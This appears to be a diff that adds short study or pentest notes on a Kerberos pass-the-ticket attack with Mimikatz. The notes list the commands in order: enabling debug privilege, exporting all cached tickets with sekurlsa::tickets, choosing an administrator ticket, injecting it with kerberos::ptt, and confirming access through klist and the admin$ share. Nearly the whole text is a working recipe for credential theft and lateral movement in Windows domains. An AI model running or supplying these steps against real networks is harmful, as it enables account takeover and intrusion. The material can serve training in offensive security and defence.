@@ -1,0 +1,22 @@
+
+ -mimikatz.exe - run mimikatz
+
+-privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+
+
+
+-sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in
+
+(May also use harvestest tickets form Rubeus.exe)
+
+
+--->When looking for which ticket to impersonate, look for an ADMINISTRATOR ticket from the KRBTGT!<---
+
+
+
+
+-kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
+
+
+
+-klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets. To verify this we can look at the admin share: dir \\IP\admin$
